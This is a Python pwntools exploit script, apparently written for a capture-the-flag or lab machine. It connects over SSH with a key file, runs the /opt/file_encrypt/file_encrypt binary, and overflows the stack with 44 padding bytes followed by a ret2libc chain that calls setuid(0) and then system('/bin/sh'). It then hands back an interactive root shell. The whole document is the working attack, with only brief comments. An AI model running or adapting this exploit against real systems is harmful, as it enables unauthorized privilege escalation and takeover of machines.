from pwn import *
 
context.update(arch='i386', os='linux')
 
# Connect to the server with SSH
ssh_connection = ssh('tester', '10.10.11.119', keyfile = '../tester.ssh')
 
# Open a shell to write more stuff to
osshell = ssh_connection.run('sh')
# libc function and argumemt address
setuid = p32(0xf7ea8f10) # libc setuid address
val_0 = p32(0x0)         # argument of setuid
system = p32(0xf7e262e0) # libc system address
shell = p32(0xf7f670af)  # libc address of string /bin/sh
 
payload = b''
payload += (b'A' * 44)   # overflow stack  
payload += setuid + system + val_0 + shell  # return addr1+return addr2+arg1+arg2
 
# Execute the binary
osshell.sendline(b'/opt/file_encrypt/file_encrypt')

# bash.sendline(b'\n') might be needed if gdb /opt/file_encrypt/file_encrypt is called
osshell.sendline(b"-202976456")
# send the payload
osshell.sendline(payload)
 
# Hand an interactive shell back to the user
osshell.interactive()